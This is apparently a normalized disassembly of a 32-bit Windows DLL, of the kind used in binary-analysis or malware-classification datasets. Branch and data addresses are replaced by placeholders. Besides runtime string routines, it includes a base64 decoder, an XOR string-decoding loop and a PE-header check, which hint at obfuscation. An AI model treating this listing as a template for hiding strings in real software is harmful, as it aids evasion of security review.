sub_10001000
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax edx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_10037e00
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1000103a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fldz
mov eax [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
xor eax [ ebp + 0xc ]
and eax 0x7fffffff
xor eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
leave
retn
sub_10001062
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_1006299d
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_100427ff
mov eax esi
sub_100010d7
push 0x3c
mov eax sub_1008564a
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ ebp - 0x24 ] 0x0
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x3c ] eax
movsb [ edi ] [ esi ]
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x34 ] 0x0
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push eax
push ebx
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0x24 ]
push ecx
call sub_10037d2f
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] 0x10
and [ ebp - 0x48 ] 0x0
mov eax [ ebp - 0x34 ]
dec esi
cmp [ ebp - 0x20 ] 0x10
jae r-xdata
mov eax [ ebp - 0x38 ]
add eax eax
mov [ ebp - 0x38 ] eax
jmp r-xdata
lea ebx [ eax + 0x1 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x34 ]
push 0x0
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x34 ]
call sub_1004ca10
cmp [ ebp - 0x20 ] 0x10
mov edi [ ebp - 0x44 ]
mov eax [ edi + 0x8 ]
mov ecx [ ebp - 0x34 ]
jae r-xdata
mov eax [ ebp + 0xc ]
mov esi [ ebp - 0x3c ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ esi + 0x4 ] eax
call sub_1002c8c0
mov eax esi
call sub_1004642f
retn 0x20
add edi 0xc
xor eax eax
jle r-xdata
push edi
lea eax [ ebp - 0x48 ]
push eax
push esi
lea eax [ ebp - 0x40 ]
push ebx
push eax
call sub_10026eb0
add esp 0x14
cmp eax 0xfffffffd
je r-xdata
push [ ebp - 0x40 ]
lea ecx [ ebp + 0xc ]
sub esi eax
add ebx eax
call sub_1002d770
test esi esi
jne r-xdata
test eax eax
js r-xdata
jne r-xdata
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
push ebx
call sub_1007fa90
pop ecx
inc eax
jmp r-xdata
sub_100011f1
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
xor ebx ebx
call sub_1001da0a
mov eax [ ebp - 0x1c ]
mov edi [ eax + 0xd4 ]
lea esi [ edi + 0x38 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0xc
push [ esi + 0x30 ]
call sub_1007fa90
push [ esi ]
mov [ ebp - 0xc ] eax
call sub_1007fa90
mov esi [ ebp - 0x8 ]
pop ecx
pop ecx
mov ecx [ ebp - 0xc ]
add eax ebx
add esi 0x4
dec [ ebp - 0x4 ]
lea ebx [ eax + ecx + 0x2 ]
mov [ ebp - 0x8 ] esi
jne r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_1002fb6b
mov esi eax
pop ecx
mov [ ebp - 0x8 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
add edi 0x68
mov eax [ ebp - 0x8 ]
leave
retn
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1003cbb0
int3
push esi
call sub_1007fa90
add esi eax
mov eax [ ebp - 0x8 ]
mov [ esi ] 0x3a
push [ edi ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_10057f0f
add esp 0x10
test eax eax
jne r-xdata
push esi
call sub_1007fa90
add esi eax
inc [ ebp - 0x4 ]
add edi 0x4
cmp [ ebp - 0x4 ] 0xc
pop ecx
jb r-xdata
mov eax [ ebp - 0x8 ]
mov [ esi ] 0x3a
push [ edi - 0x30 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_10057f0f
add esp 0xc
test eax eax
jne r-xdata
mov [ esi ] 0x0
sub_100012f0
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
lea edx [ ebp - 0x84 ]
push r--data
push edx
mov edx 0x40
mov [ ebp - 0x88 ] 0x0
call sub_10072780
add esp 0x10
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
lea eax [ ebp - 0x84 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x84 ]
push ecx
mov ecx esi
call sub_1005ddc0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10001380
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x10 ]
push edi
mov edi ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
call sub_100167b0
add esp 0xc
test eax eax
jne r-xdata
test [ ebp + 0x8 ] 0x10
je r-xdata
mov [ ebp - 0x4 ] 0x4
test [ ebp + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x8 ]
push edx
push ebx
mov edx esi
mov ecx edi
call sub_10057b80
add esp 0x8
test eax eax
jne r-xdata
test [ ebp + 0x8 ] 0x8
je r-xdata
push ebx
push edi
mov ecx esi
call sub_10036070
add esp 0x8
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0x10
mov eax [ ebp + 0x8 ]
push eax
push ebx
mov ecx esi
mov edx edi
call sub_1004a100
add esp 0x8
test eax eax
jne r-xdata
push ebx
mov edx esi
mov ecx edi
call sub_10006150
add esp 0x4
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0x20
mov ecx [ ebp + 0x8 ]
push ecx
push ebx
mov ecx esi
mov edx edi
call sub_10036580
add esp 0x8
test eax eax
mov eax [ ebp - 0x4 ]
jne r-xdata
or [ ebp - 0x4 ] 0x1
or [ ebp - 0x4 ] 0x8
pop edi
mov esp ebp
pop ebp
retn
or eax 0x2
sub_1000143f
push 0x4
mov eax sub_10085a68
call sub_100624bc
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
sar eax 0x1
mov [ ebp - 0x10 ] 0x1
je r-xdata
push edi
push eax
mov ecx esi
call sub_1005b488
mov eax esi
call sub_10013ab8
retn 0xc
lea ebx [ ecx + 0x8 ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp edx 0x8
jb r-xdata
cmp eax edi
ja r-xdata
push ebx
push [ ebp + 0x10 ]
lea eax [ ecx + eax * 2 ]
push [ ebp + 0xc ]
push eax
push edx
call sub_1001bed9
add esp 0x14
cmp eax [ esi + 0x10 ]
jbe r-xdata
push edi
push eax
mov ecx esi
call sub_1005b488
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
sub_100014d0
push ebp
mov ebp esp
mov ecx [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ecx + 0xc ]
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x8 ]
mov eax [ eax + esi * 4 ]
test eax eax
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
je r-xdata
pop esi
pop ebp
retn 0x4
call sub_1001706d
cmp esi [ eax + 0xc ]
jae r-xdata
xor eax eax
mov ecx [ eax + 0x8 ]
mov eax [ ecx + esi * 4 ]
pop esi
pop ebp
retn 0x4
sub_1000150e
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_10053319
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_10070772
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_10006356
pop ecx
sub_1000155b
push 0x60
mov eax sub_100857c3
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
xor ebx ebx
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
inc ebx
test [ esi + 0x14 ] 0x4000
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x6c ] eax
mov ecx esi
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_10013950
mov esi [ esi + 0x14 ]
lea ecx [ ebp - 0x5c ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x4
call sub_100275d9
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10060ef0
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_10034a80
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10013950
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_10071f2c
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10034a80
push edi
xor eax eax
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x38 ] 0x7
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] ax
call sub_1002e2e1
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_1006e90e
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_100517e0
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1003c519
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10067e0a
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10055b84
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_100517e0
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1003c519
cmp [ ebp - 0x38 ] 0x8
mov eax [ ebp - 0x4c ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1004c1a2
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_1003c519
jmp r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_10001708
push 0x38
mov eax sub_1008581d
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1006f961
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10060a86
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_10034a80
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_100017c0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi eax
xor ecx ecx
xor edi edi
xor edx edx
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov eax esi
sub eax edx
cmp eax 0x2
mov eax [ ebp + 0x10 ]
jb r-xdata
mov al [ edx + eax ]
cmp al 0xa
je r-xdata
cmp [ edx + eax ] 0xd
jne r-xdata
inc edx
cmp edx esi
jb r-xdata
cmp al 0x3d
jne r-xdata
cmp [ edx + eax + 0x1 ] 0xa
je r-xdata
mov [ ebp - 0x4 ] edx
test edi edi
jne r-xdata
cmp al 0x7f
ja r-xdata
inc ecx
cmp ecx 0x2
ja r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ edi + edi * 2 ]
lea ecx [ ecx + ecx + 0x7 ]
shr ecx 0x3
test eax eax
je r-xdata
pop edi
mov eax 0xffffffd4
pop esi
mov esp ebp
pop ebp
retn
movzx eax al
mov al [ eax + r--data ]
cmp al 0x7f
je r-xdata
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] ecx
mov eax 0xffffffd6
pop esi
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0xc ]
cmp [ esi ] ecx
jb r-xdata
cmp al 0x40
jae r-xdata
xor ecx ecx
xor edi edi
push ebx
mov ebx 0x3
mov esi eax
test edx edx
je r-xdata
inc edi
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
sub esi eax
pop ebx
pop edi
mov [ ecx ] esi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0xd
je r-xdata
inc [ ebp + 0x10 ]
dec edx
mov [ ebp - 0x4 ] edx
test edx edx
jne r-xdata
cmp al 0xa
je r-xdata
mov eax [ ebp + 0x8 ]
movzx edx al
mov al [ edx + r--data ]
xor edx edx
cmp al 0x40
sete dl
movzx eax al
and eax 0x3f
shl ecx 0x6
inc edi
sub ebx edx
or ecx eax
cmp edi 0x4
jne r-xdata
mov edx [ ebp - 0x4 ]
xor edi edi
test ebx ebx
je r-xdata
cmp ebx 0x1
jbe r-xdata
mov edx ecx
shr edx 0x10
mov [ esi ] dl
inc esi
mov edx [ ebp - 0x4 ]
cmp ebx 0x2
jbe r-xdata
mov eax ecx
shr eax 0x8
mov [ esi ] al
inc esi
mov [ esi ] cl
inc esi
jmp r-xdata
sub_100018ee
push 0x38
mov eax sub_100857f0
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_100424ab
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10034a80
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10060ef0
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_100019c0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0xffffffff
ja r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10069ac6
push r--data
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] r--data
call sub_10024fe9
push ecx
call sub_1001f84c
add esp 0x4
test eax eax
jne r-xdata
sub_10001a0f
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10060d3e
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_10001ac6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov ecx [ ebp + 0x10 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp ecx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
jmp r-xdata
push [ eax + 0x4 ]
push ecx
push [ ebp + 0xc ]
push ecx
push [ ebp + 0x8 ]
push 0x1001
push [ eax + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1005e3b7
add esp 0x20
cmp eax ebx
jne r-xdata
push [ ebp + 0x14 ]
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10023bb0
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10001ba4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_1001821c
pop ecx
pop ebp
retn
sub_10001be0
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_10056f45
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_10007908
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_100528c9
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x20
sub_10001ca2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
leave
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_10069e87
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp + 0x20 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_100030fa
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_1007f360
add esp 0xc
test eax eax
je r-xdata
sub_10001d40
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x7c
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0xe
jb r-xdata
lea ecx [ ebx + 0x138 ]
xor eax eax
push ecx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x8 ] ax
call sub_10018bb0
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x70 ]
mov eax 0x108
call sub_10053240
sub_10001dc0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_10001df5
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ esi ] eax
mov eax [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x4 ] ecx
xor ecx ecx
mov [ edi ] eax
mov eax [ esi ]
cmp eax ebx
setne cl
mov [ ebp + 0x14 ] ecx
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ edi ]
cmp ecx [ ebp + 0x1c ]
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ esi ]
add edx 0x8
push edx
push [ ebp + 0x8 ]
mov edx ebx
sub edx eax
push edx
push eax
push ecx
call sub_10026eb0
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
mov [ esi ] ebx
cmp eax 0xffffffff
je r-xdata
push 0x2
pop eax
jmp r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x1c
cmp eax 0xfffffffd
jne r-xdata
mov ecx [ edi ]
cmp [ ecx ] ax
jne r-xdata
add [ esi ] eax
add [ edi ] 0x2
and [ ebp + 0x14 ] 0x0
cmp [ esi ] ebx
jne r-xdata
xor eax eax
push [ esi ]
call sub_1007fa90
pop ecx
inc eax
jmp r-xdata
sub_10001ea0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi eax
cmp esi eax
je r-xdata
mov [ ebp + 0xc ] esi
cmp esi eax
jne r-xdata
movsx eax [ esi ]
push eax
call [ ebp + 0x14 ]
add esp 0x4
test eax eax
jne r-xdata
mov edi esi
inc esi
push ebx
mov ebx eax
cmp esi eax
je r-xdata
